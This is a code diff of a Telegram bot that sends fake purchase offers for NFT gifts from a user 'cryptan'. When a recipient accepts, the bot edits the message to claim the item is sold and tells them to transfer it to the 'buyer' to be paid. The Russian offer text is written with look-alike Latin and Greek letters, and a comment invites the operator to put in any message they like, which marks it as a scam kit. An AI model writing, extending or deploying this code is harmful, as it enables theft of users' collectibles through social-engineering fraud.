@@ -23,7 +23,6 @@ client_user_ids = {}
 LOCALES = {
     "ru": {
         "offer_text": 'Пoльзοватeль <b>cryptan</b> пρeдлагaет Bам <b>{amount} {currency_emoji}</b> зa кoллeкционный пpедмeт <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПpeдлοжeние дeйcтвyeт в тeчeнии 5 ч. 59 мин..',
-        "accept_text": '{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a> <b>успешно продан!</b>\n\n<b>• Передайте покупателю для зачисления {currency_name}.</b>',
         "btn_decline": "Отклонить",
         "btn_accept": "Принять",
         "btn_transfer": "Передать",
@@ -32,7 +31,6 @@ LOCALES = {
     },
     "eng": {
         "offer_text": 'User <b>cryptan</b> offers you <b>{amount} {currency_emoji}</b> for the collectible item <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nOffer is valid for 5 h. 59 min..',
-        "accept_text": '{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a> <b>successfully sold!</b>\n\n<b>• Transfer to the buyer to credit {currency_name}.</b>',
         "btn_decline": "Decline",
         "btn_accept": "Accept",
         "btn_transfer": "Transfer",
@@ -41,7 +39,6 @@ LOCALES = {
     },
     "ukr": {
         "offer_text": 'Користувач <b>cryptan</b> пропонує Вам <b>{amount} {currency_emoji}</b> за колекційний предмет <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПропозиція діє протягом 5 год. 59 хв..',
-        "accept_text": '{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a> <b>успішно продано!</b>\n\n<b>• Передайте покупцю для зарахування {currency_name}.</b>',
         "btn_decline": "Відхилити",
         "btn_accept": "Прийняти",
         "btn_transfer": "Передати",
@@ -50,7 +47,6 @@ LOCALES = {
     },
     "cn": {
         "offer_text": '用户 <b>cryptan</b> 向您出价 <b>{amount} {currency_emoji}</b> 购买收藏品 <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n此出价有效期为 5 小时 59 分钟。',
-        "accept_text": '{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}"><b>{gift_name} #{gift_num}</b></a> <b>已成功售出！</b>\n\n<b>• 请将物品转给买家以完成 {currency_name} 的到账。</b>',
         "btn_decline": "拒绝",
         "btn_accept": "接受",
         "btn_transfer": "转移",
@@ -93,19 +89,6 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
                 InlineKeyboardButton(text=loc['btn_accept'], callback_data=cb_data, icon_custom_emoji_id="5776375003280838798")
             ]
         ]
-    )
-
-def build_accept_text(gift_name, gift_num, currency_name, lang):
-    slug = gift_name.replace(" ", "")
-    loc = LOCALES.get(lang, LOCALES["ru"])
-    success_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
-
-    return loc["accept_text"].format(
-        success_emoji=success_emoji,
-        slug=slug,
-        gift_name=gift_name,
-        gift_num=gift_num,
-        currency_name=currency_name
     )
 
 def make_accept_keyboard(lang):
@@ -199,10 +182,19 @@ async def accept_offer(cb: CallbackQuery):
 
     _, slug, gift_num_str, amount, currency_type, lang = parts
     gift_num = int(gift_num_str)
-    gift_name = slug
     
     currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"
-    text = build_accept_text(gift_name, gift_num, currency_name, lang) + "\u200B"
+    
+    # ==========================================
+    # И ТУТ ТЫ МОЖЕШЬ ИЗМЕНИТЬ ТЕКСТ НА СООБЩЕНИЕ КОТОРОЕ ХОЧЕШЬ:
+    # ==========================================
+    success_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
+    text = (
+        f"{success_emoji} <b>Предмет #{gift_num} успешно продан!</b>\n\n"
+        f"<b>• Передайте покупателю для зачисления {currency_name}.</b>\n"
+        f"\u200B"
+    )
+    # ==========================================
     
     chat_id = cb.message.chat.id
     message_id = cb.message.message_id
@@ -212,7 +204,7 @@ async def accept_offer(cb: CallbackQuery):
 
     success = False
 
-    # Способ 1: Пытаемся обновить через стандартный метод редактирования
+    # Способ 1: Обычное редактирование
     try:
         await bot.edit_message_text(
             chat_id=chat_id,
@@ -226,7 +218,7 @@ async def accept_offer(cb: CallbackQuery):
     except Exception:
         pass
 
-    # Способ 2: Если первый не прошел, пробуем через Business Connection ID
+    # Способ 2: Редактирование через Business Connection ID
     if not success and bcid:
         try:
             await bot.edit_message_text(
@@ -240,8 +232,7 @@ async def accept_offer(cb: CallbackQuery):
             )
             success = True
         except Exception as e:
-            error_str = str(e)
-            if "message is not modified" in error_str:
+            if "message is not modified" in str(e):
                 success = True
 
     if not success:
